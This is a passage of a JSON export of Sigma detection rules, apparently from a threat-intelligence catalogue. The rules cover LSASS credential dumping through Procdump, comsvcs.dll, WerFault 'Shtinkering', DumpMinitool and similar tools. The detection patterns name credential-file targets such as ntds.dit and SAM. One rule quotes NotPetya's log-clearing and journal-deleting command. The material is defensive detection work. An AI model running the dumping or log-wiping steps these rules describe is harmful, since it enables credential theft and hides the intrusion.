                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2012/06/27\ndescription: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz,\n  Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or\n  dbgcore.dll for win10, server2016 and up.\ndetection:\n  condition: selection\n  selection:\n    GrantedAccess: '0x1FFFFF'\n    SourceImage|endswith: \\WerFault.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Actual failures in lsass.exe that trigger a crash dump (unlikely)\n- Unknown cases in which WerFault accesses lsass.exe\nid: e5b33f7d-eb93-48b6-9851-09e1e610b6d7\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/helpsystems/nanodump/commit/578116faea3d278d53d70ea932e2bbfe42569507\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: WerFault Accassing LSASS\n",
                            "sigma:id": "e5b33f7d-eb93-48b6-9851-09e1e610b6d7",
                            "title": "WerFault Accassing LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1a1ed54a-2ba4-4221-94d5-01dee560d71e",
                        "lookup_data": {
                            "description": "Detects uses of a renamed legitimate createdump.exe LOLOBIN utility to dump process memory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/09/20\ndescription: Detects uses of a renamed legitimate createdump.exe LOLOBIN utility to\n  dump process memory\ndetection:\n  condition: 1 of selection* and not filter\n  filter:\n    Image|endswith: \\createdump.exe\n  selection:\n    OriginalFileName: FX_VER_INTERNALNAME_STR\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -u '\n    - ' -f '\n    - .dmp\nfalsepositives:\n- Command lines that use the same flags\nid: 1a1ed54a-2ba4-4221-94d5-01dee560d71e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\n- https://twitter.com/bopin2020/status/1366400799199272960\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: Renamed CreateDump Process Dump\n",
                            "sigma:id": "1a1ed54a-2ba4-4221-94d5-01dee560d71e",
                            "title": "Renamed CreateDump Process Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2e69f167-47b5-4ae7-a390-47764529eff5",
                        "lookup_data": {
                            "description": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
                            "raw": "author: '@neu5ron, Teymur Kheirkhabarov, oscd.community'\ndate: 2020/04/02\ndescription: Transferring files with well-known filenames (sensitive files with credential\n  data) using network shares\ndetection:\n  condition: selection\n  selection:\n    name:\n    - \\mimidrv\n    - \\lsass\n    - \\windows\\minidump\\\n    - \\hiberfil\n    - \\sqldmpr\n    - \\sam\n    - \\ntds.dit\n    - \\security\nfalsepositives:\n- Transferring sensitive files for legitimate administration work by legitimate administrator\nid: 2e69f167-47b5-4ae7-a390-47764529eff5\nlevel: medium\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 910ab938-668b-401b-b08c-b596e80fdca5\n  type: similar\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.001\n- attack.t1003.003\ntitle: Transferring Files with Credential Data via Network Shares - Zeek\n",
                            "sigma:id": "2e69f167-47b5-4ae7-a390-47764529eff5",
                            "title": "Transferring Files with Credential Data via Network Shares - Zeek",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3",
                        "lookup_data": {
                            "description": "Detects potential credential dumping via Windows Error Reporting LSASS Shtinkering technique which uses the Windows Error Reporting to dump lsass",
                            "raw": "author: '@pbssubhash , Nasreddine Bencherchali'\ndate: 2022/12/08\ndescription: Detects potential credential dumping via Windows Error Reporting LSASS\n  Shtinkering technique which uses the Windows Error Reporting to dump lsass\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_lsass:\n    ParentImage: C:\\Windows\\System32\\lsass.exe\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -u -p '\n    - ' -ip '\n    - ' -s '\n    ParentUser|contains:\n    - AUTHORI\n    - AUTORI\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  selection_img:\n  - Image|endswith: \\Werfault.exe\n  - OriginalFileName: WerFault.exe\nfalsepositives:\n- Windows Error Reporting might produce similar behavior. In that case, check the\n  PID associated with the \"-p\" parameter in the CommandLine.\nid: 9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://github.com/deepinstinct/Lsass-Shtinkering\n- https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Via WER\n",
                            "sigma:id": "9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3",
                            "title": "Potential Credential Dumping Via WER",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a18e0862-127b-43ca-be12-1a542c75c7c5",
                        "lookup_data": {
                            "description": "Detects windows error reporting event where the process that crashed is lsass. This could be the cause of an intentional crash by techniques such as Lsass-Shtinkering to dump credential",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/07\ndescription: Detects windows error reporting event where the process that crashed\n  is lsass. This could be the cause of an intentional crash by techniques such as\n  Lsass-Shtinkering to dump credential\ndetection:\n  condition: selection\n  selection:\n    AppName: lsass.exe\n    EventID: 1000\n    ExceptionCode: c0000001\n    Provider_Name: Application Error\nfalsepositives:\n- Rare legitimate crashing of the lsass process\nid: a18e0862-127b-43ca-be12-1a542c75c7c5\nlevel: high\nlogsource:\n  product: windows\n  service: application\nreferences:\n- https://github.com/deepinstinct/Lsass-Shtinkering\n- https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf\n- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Via WER - Application\n",
                            "sigma:id": "a18e0862-127b-43ca-be12-1a542c75c7c5",
                            "title": "Potential Credential Dumping Via WER - Application",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0f920ebe-7aea-4c54-b202-9aa0c609cfe5",
                        "lookup_data": {
                            "description": "Detects PowerShell processes requesting access to \"lsass.exe\"",
                            "raw": "author: oscd.community, Natalia Shornikova\ndate: 2020/10/06\ndescription: Detects PowerShell processes requesting access to \"lsass.exe\"\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: 0f920ebe-7aea-4c54-b202-9aa0c609cfe5\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/12/18\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nrelated:\n- id: 3f07b9d1-2082-4c56-9277-613a621983cc\n  type: obsoletes\n- id: fb656378-f909-47c1-8747-278bf09f4f4f\n  type: similar\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Attempt Via PowerShell\n",
                            "sigma:id": "0f920ebe-7aea-4c54-b202-9aa0c609cfe5",
                            "title": "Potential Credential Dumping Attempt Via PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "678dfc63-fefb-47a5-a04c-26bcf8cc9f65",
                        "lookup_data": {
                            "description": "Detects process access to LSASS memory with suspicious access flags 0x410 and 0x01410 (spin-off of similar rule)",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/13\ndescription: Detects process access to LSASS memory with suspicious access flags 0x410\n  and 0x01410 (spin-off of similar rule)\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    SourceImage:\n    - C:\\WINDOWS\\system32\\taskmgr.exe\n    - C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAMService.exe\n    - C:\\PROGRAMDATA\\MALWAREBYTES\\MBAMSERVICE\\ctlrupdate\\mbupdatr.exe\n    - C:\\WINDOWS\\system32\\taskhostw.exe\n    - C:\\Program Files\\Windows Defender\\MsMpEng.exe\n    - C:\\Windows\\SysWOW64\\msiexec.exe\n    - C:\\Windows\\System32\\msiexec.exe\n    - C:\\Windows\\System32\\lsass.exe\n    - C:\\WINDOWS\\System32\\perfmon.exe\n    - C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n    - C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe\n    - C:\\Program Files\\Common Files\\McAfee\\MMSSHost\\MMSSHOST.exe\n  filter2:\n    SourceImage|endswith: \\MsMpEng.exe\n    SourceImage|startswith: C:\\ProgramData\\Microsoft\\Windows Defender\\\n  filter3:\n    SourceImage|endswith: \\GamingServices.exe\n    SourceImage|startswith: C:\\Program Files\\WindowsApps\\\n  filter4:\n    SourceImage|endswith:\n    - \\PROCEXP64.EXE\n    - \\PROCEXP.EXE\n  filter5:\n    SourceImage|endswith: \\vmtoolsd.exe\n    SourceImage|startswith: C:\\ProgramData\\VMware\\VMware Tools\\\n  filter6:\n    SourceImage|contains: Antivirus\n    SourceImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n  filter_games:\n    GrantedAccess:\n    - '0x410'\n    - '0x10'\n    SourceImage|contains: \\SteamLibrary\\steamapps\\\n  filter_generic:\n    SourceImage|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n    - C:\\WINDOWS\\system32\\\n  filter_localappdata:\n    SourceImage|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\\n    SourceImage|endswith:\n    - \\Microsoft VS Code\\Code.exe\n    - \\software_reporter_tool.exe\n    - \\DropboxUpdate.exe\n    - \\MBAMInstallerService.exe\n    - \\WebEx\\WebexHost.exe\n    - \\Programs\\Microsoft VS Code\\Code.exe\n    - \\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe\n  filter_ms_products:\n    GrantedAccess: '0x1410'\n    SourceImage|contains|all:\n    - \\AppData\\Local\\Temp\\\n    - \\vs_bootstrapper_\n  filter_nextron:\n    SourceImage|endswith:\n    - \\thor64.exe\n    - \\thor.exe\n    - \\aurora-agent-64.exe\n    - \\aurora-agent.exe\n  filter_wer:\n    SourceCommandLine: C:\\WINDOWS\\system32\\wermgr.exe -upload\n  filter_xampp:\n    GrantedAccess: '0x410'\n    SourceImage|endswith: \\xampp-control.exe\n  selection:\n    GrantedAccess|endswith: '10'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Legitimate software accessing LSASS process for legitimate reason\nfields:\n- User\n- SourceImage\n- GrantedAccess\nid: 678dfc63-fefb-47a5-a04c-26bcf8cc9f65\nlevel: medium\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/11/13\nreferences:\n- https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights\n- https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\nrelated:\n- id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: Rare GrantedAccess Flags on LSASS Access\n",
                            "sigma:id": "678dfc63-fefb-47a5-a04c-26bcf8cc9f65",
                            "title": "Rare GrantedAccess Flags on LSASS Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dee0a7a3-f200-4112-a99b-952196d81e42",
                        "lookup_data": {
                            "description": "Detects the use of a Visual Studio bundled tool named DumpMinitool.exe",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/06\ndescription: Detects the use of a Visual Studio bundled tool named DumpMinitool.exe\ndetection:\n  condition: 1 of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' --processId '\n    - ' --dumpType Full'\n  selection_img:\n  - Image|endswith: \\DumpMinitool.exe\n  - OriginalFileName: DumpMinitool.exe\nfalsepositives:\n- Unknown\nid: dee0a7a3-f200-4112-a99b-952196d81e42\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://twitter.com/mrd0x/status/1511415432888131586?s=20&t=DvVrzeZ1OcGiWowbhPV8Lg\n- https://twitter.com/mrd0x/status/1511489821247684615\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: DumpMinitool Usage\n",
                            "sigma:id": "dee0a7a3-f200-4112-a99b-952196d81e42",
                            "title": "DumpMinitool Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e074832a-eada-4fd7-94a1-10642b130e16",
                        "lookup_data": {
                            "description": "Detects default lsass dump filename from SafetyKatz",
                            "raw": "author: Markus Neis\ndate: 2018/07/24\ndescription: Detects default lsass dump filename from SafetyKatz\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\Temp\\debug.bin\nfalsepositives:\n- Rare legitimate files with similar filename structure\nid: e074832a-eada-4fd7-94a1-10642b130e16\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/GhostPack/SafetyKatz\n- https://github.com/GhostPack/SafetyKatz/blob/715b311f76eb3a4c8d00a1bd29c6cd1899e450b7/SafetyKatz/Program.cs#L63\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: SafetyKatz Default Dump Filename\n",
                            "sigma:id": "e074832a-eada-4fd7-94a1-10642b130e16",
                            "title": "SafetyKatz Default Dump Filename",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2f869d59-7f6a-4931-992c-cce556ff2d53",
                        "lookup_data": {
                            "description": "The \"AdPlus.exe\" binary that is part of the Windows SDK can be used as a lolbin to dump process memory and execute arbitrary commands",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/09\ndescription: The \"AdPlus.exe\" binary that is part of the Windows SDK can be used as\n  a lolbin to dump process memory and execute arbitrary commands\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - ' -hang '\n    - ' -pn '\n    - ' -pmn '\n    - ' -p '\n    - ' -po '\n    - ' -c '\n    - ' -sc '\n  selection_img:\n  - Image|endswith: \\adplus.exe\n  - OriginalFileName: Adplus.exe\nfalsepositives:\n- Legitimate usage of Adplus\nid: 2f869d59-7f6a-4931-992c-cce556ff2d53\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/\n- https://twitter.com/nas_bench/status/1534916659676422152\n- https://twitter.com/nas_bench/status/1534915321856917506\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1003.001\ntitle: Use of Adplus.exe\n",
                            "sigma:id": "2f869d59-7f6a-4931-992c-cce556ff2d53",
                            "title": "Use of Adplus.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
                        "lookup_data": {
                            "description": "Detects a suspicious LSASS process process clone that could be a sign of process dumping activity",
                            "raw": "author: Florian Roth (Nextron Systems), Samir Bousseaden\ndate: 2021/11/27\ndescription: Detects a suspicious LSASS process process clone that could be a sign\n  of process dumping activity\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\Windows\\System32\\lsass.exe\n    ParentImage|endswith: \\Windows\\System32\\lsass.exe\nfalsepositives:\n- Unknown\nid: c8da0dfd-4ed0-4b68-962d-13c9c884384e\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/\n- https://twitter.com/Hexacorn/status/1420053502554951689\n- https://twitter.com/SBousseaden/status/1464566846594691073?s=20\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1003.001\ntitle: Suspicious LSASS Process Clone\n",
                            "sigma:id": "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
                            "title": "Suspicious LSASS Process Clone",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "79aeeb41-8156-4fac-a0cd-076495ab82a1",
                        "lookup_data": {
                            "description": "Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil",
                            "raw": "author: Florian Roth (Nextron Systems), Tom Ueltschi\ndate: 2019/01/16\ndescription: Detects NotPetya ransomware activity in which the extracted passwords\n  are passed back to the main module via named pipe, the file system journal of drive\n  C is deleted and windows eventlogs are cleared using wevtutil\ndetection:\n  condition: 1 of selection*\n  selection_pattern:\n    CommandLine|contains:\n    - 'wevtutil cl Application & fsutil usn deletejournal /D C:'\n    - dllhost.dat %WINDIR%\\ransoms\n  selection_perfc_keyword:\n  - \\perfc.dat\n  selection_rundll32_dash1:\n    CommandLine|endswith:\n    - .dat,#1\n    - '.dat #1'\n    - .zip.dll\",#1\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 79aeeb41-8156-4fac-a0cd-076495ab82a1\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/15\nreferences:\n- https://securelist.com/schroedingers-petya/78870/\n- https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.t1070.001\n- attack.credential_access\n- attack.t1003.001\n- car.2016-04-002\ntitle: NotPetya Ransomware Activity\n",
                            "sigma:id": "79aeeb41-8156-4fac-a0cd-076495ab82a1",
                            "title": "NotPetya Ransomware Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a49fa4d5-11db-418c-8473-1e014a8dd462",
                        "lookup_data": {
                            "description": "Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/10/20\ndescription: Detects adversaries leveraging the MiniDump export function from comsvcs.dll\n  via rundll32 to perform a memory dump from lsass.\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains: comsvcs.dll\n    SourceImage: C:\\Windows\\System32\\rundll32.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: a49fa4d5-11db-418c-8473-1e014a8dd462\nlevel: critical\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/shantanukhande/status/1229348874298388484\n- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Lsass Memory Dump via Comsvcs DLL\n",
                            "sigma:id": "a49fa4d5-11db-418c-8473-1e014a8dd462",
                            "title": "Lsass Memory Dump via Comsvcs DLL",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2e65275c-8288-4ab4-aeb7-6274f58b6b20",
                        "lookup_data": {
                            "description": "Detects usage of the SysInternals Procdump utility",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/08/16\ndescription: Detects usage of the SysInternals Procdump utility\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\procdump.exe\n    - \\procdump64.exe\nfalsepositives:\n- Legitimate use of procdump by a developer or administrator\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/11\nreferences:\n- Internal Research\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: Procdump Usage\n",
                            "sigma:id": "2e65275c-8288-4ab4-aeb7-6274f58b6b20",
                            "title": "Procdump Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "79b06761-465f-4f88-9ef2-150e24d3d737",
                        "lookup_data": {
                            "description": "Detects uses of the SysInternals Procdump utility in which procdump or its output get renamed or a dump file is moved ot copied to a different name",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects uses of the SysInternals Procdump utility in which procdump or\n  its output get renamed or a dump file is moved ot copied to a different name\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains:\n    - copy procdump\n    - move procdump\n  selection2:\n    CommandLine|contains:\n    - 2.dmp\n    - lsass\n    - out.dmp\n    CommandLine|contains|all:\n    - 'copy '\n    - '.dmp '\n  selection3:\n    CommandLine|contains:\n    - copy lsass.exe_\n    - move lsass.exe_\nfalsepositives:\n- Cases in which procdump just gets copied to a different directory without any renaming\nid: 79b06761-465f-4f88-9ef2-150e24d3d737\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/mrd0x/status/1480785527901204481\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: Procdump Evasion\n",
                            "sigma:id": "79b06761-465f-4f88-9ef2-150e24d3d737",
                            "title": "Procdump Evasion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5ef9853e-4d0e-4a70-846f-a9ca37d876da",
                        "lookup_data": {
                            "description": "Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.",
                            "raw": "author: Samir Bousseaden, Michael Haag\ndate: 2019/04/03\ndescription: Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz,\n  Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or\n  dbgcore.dll for win10, server2016 and up.\ndetection:\n  condition: selection and not 1 of filter*\n  filter_sysmon:\n    SourceImage: C:\\Windows\\Sysmon64.exe\n  filter_thor:\n    CallTrace|contains|all:\n    - '|C:\\Windows\\Temp\\asgard2-agent\\'\n    - \\thor\\thor64.exe+\n    - '|UNKNOWN('\n    GrantedAccess: '0x103800'\n  selection:\n    CallTrace|contains:\n    - dbghelp.dll\n    - dbgcore.dll\n    - ntdll.dll\n    GrantedAccess|contains:\n    - '0x1038'\n    - '0x1438'\n    - '0x143a'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- False positives are present when looking for 0x1410. Exclusions may be required.\nid: 5ef9853e-4d0e-4a70-846f-a9ca37d876da\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/09/29\nreferences:\n- https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.001/T1003.001.md\n- https://research.splunk.com/endpoint/windows_possible_credential_dumping/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: LSASS Memory Dump\n",
                            "sigma:id": "5ef9853e-4d0e-4a70-846f-a9ca37d876da",
                            "title": "LSASS Memory Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "33efc23c-6ea2-4503-8cfe-bdf82ce8f719",
                        "lookup_data": {
                            "description": "Detects the setting of the \"DumpType\" registry value to \"2\" which stands for a \"Full Dump\". Technique such as LSASS Shtinkering requires this value to be \"2\" in order to dump LSASS.",
                            "raw": "author: '@pbssubhash'\ndate: 2022/12/08\ndescription: Detects the setting of the \"DumpType\" registry value to \"2\" which stands\n  for a \"Full Dump\". Technique such as LSASS Shtinkering requires this value to be\n  \"2\" in order to dump LSASS.\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000002)\n    EventType: SetValue\n    TargetObject|contains:\n    - \\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\DumpType\n    - \\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\lsass.exe\\DumpType\nfalsepositives:\n- Legitimate application that needs to do a full dump of their process\nid: 33efc23c-6ea2-4503-8cfe-bdf82ce8f719\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/deepinstinct/Lsass-Shtinkering\n- https://learn.microsoft.com/en-us/windows/win32/wer/collecting-user-mode-dumps\n- https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Lsass Full Dump Request Via DumpType Registry Settings\n",
                            "sigma:id": "33efc23c-6ea2-4503-8cfe-bdf82ce8f719",
                            "title": "Lsass Full Dump Request Via DumpType Registry Settings",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9bd012ee-0dff-44d7-84a0-aa698cfd87a3",
                        "lookup_data": {
                            "description": "Detects a possible process memory dump based on a keyword in the file name of the accessing process",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/10\ndescription: Detects a possible process memory dump based on a keyword in the file\n  name of the accessing process\ndetection:\n  condition: selection\n  selection:\n    GrantedAccess|endswith:\n    - '10'\n    - '30'\n    - '50'\n    - '70'\n    - '90'\n    - B0\n    - D0\n    - F0\n    - '18'\n    - '38'\n    - '58'\n    - '78'\n    - '98'\n    - B8\n    - D8\n    - F8\n    - 1A\n    - 3A\n    - 5A\n    - 7A\n    - 9A\n    - BA\n    - DA\n    - FA\n    - '0x14C2'\n    - FF\n    SourceImage|contains: dump\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Rare programs that contain the word dump in their name and access lsass\nid: 9bd012ee-0dff-44d7-84a0-aa698cfd87a3\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nreferences:\n- https://twitter.com/_xpn_/status/1491557187168178176\n- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: LSASS Memory Access by Tool Named Dump\n",
                            "sigma:id": "9bd012ee-0dff-44d7-84a0-aa698cfd87a3",
                            "title": "LSASS Memory Access by Tool Named Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
                        "lookup_data": {
                            "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/02/04\ndescription: Detects the use of Dumpert process dumper, which dumps the lsass.exe\n  process memory\ndetection:\n  condition: selection\n  selection:\n    Hashes|contains: 09D278F9DE118EF09163C6140255C690\nfalsepositives:\n- Very unlikely\nid: 2704ab9e-afe2-4854-a3b1-0c0706d03578\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/outflanknl/Dumpert\n- https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Dumpert Process Dumper\n",
                            "sigma:id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
                            "title": "Dumpert Process Dumper",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "78cc2dd2-7d20-4d32-93ff-057084c38b93",
                        "lookup_data": {
                            "description": "Detects a highly relevant Antivirus alert that reports a password dumper",
